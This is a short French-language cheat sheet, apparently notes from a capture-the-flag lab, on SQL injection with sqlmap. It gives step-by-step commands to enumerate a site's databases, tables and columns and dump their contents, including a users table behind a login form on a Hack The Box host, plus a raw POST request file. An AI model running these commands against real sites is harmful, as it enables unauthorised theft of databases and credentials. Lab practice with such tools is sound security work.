## Injection SQL

1. Nous allons donc commencer par ouvrir notre terminal et taper la commande suivant :

`sqlmap -u www.votre_site.fr --dbs`

* Sqlmap => on lance le logiciel
* -u => on définit l’adresse du site
* --dbs => on demande d’afficher les bases de données du site

2. Nous allons ensuite vouloir voir les table d’une base de données :

`sqlmap -u www.votre_site.fr -D votre_base_de_données --tables`

* Sqlmap => on lance le logiciel
* -u => on définit l’adresse du site
* -D => on définit la base de données à montrer
* --tables => on demande d’afficher les tables d’une base de données

3. Nous allons essayer de voir les colonnes de notre table :

`sqlmap -u www.votre_site.fr -D votre_base_de_données -T votre_table --columns`

* Sqlmap => on lance le logiciel
* -u => on définit l’adresse du site
* -D => on définit la base de données à montrer
* -T => on demande d’afficher les tables d’une base de données
* --columns => on affiche toutes colonnes de la table

4. Nous allons finalement afficher les entrées correspondantes aux colonnes :

`sqlmap -u www.votre_site.fr -D votre_base_de_donnée -T votre_table -C vos_colonnes --dump`

* Sqlmap => on lance le logiciel
* -u => on définit l’adresse du site
* -D => on définit la base de données à montrer
* -T => on demande d’afficher les tables d’une base de données
* -C => on choisis la ou les colonnes de la table
* --dump => on récupere tout
* --batch => permet de repondre au question automatiquement 
 
5. Formulaire HTTPS

`sqlmap -u "https://admin-portal.europacorp.htb/login.php" --data "email=toto%40toto.com&password=passwordTot%21" -D admin -T users --batch --dump`

* --data => sqlmap effectue automatiquement les requêtes POST. Les données POST d'une demande peuvent être écrites directement


`sqlmap -r file_request.txt --dbms mysql -p email --force-ssl`


6. SqlMap avec une requête HTTP à partir d'un fichier

`sqlmap -r file_request.txt`

Dans le fichier file_request.txt :

	POST /department/login.php HTTP/1.1
	Host: 10.10.10.43
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Referer: http://10.10.10.43/department/login.php
	Cookie: PHPSESSID=h242cek8uo9si35jak0c0r0616
	Connection: close
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 28	
	username=admin&password=test




Plus d'information sur les option de [SQLMAP](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
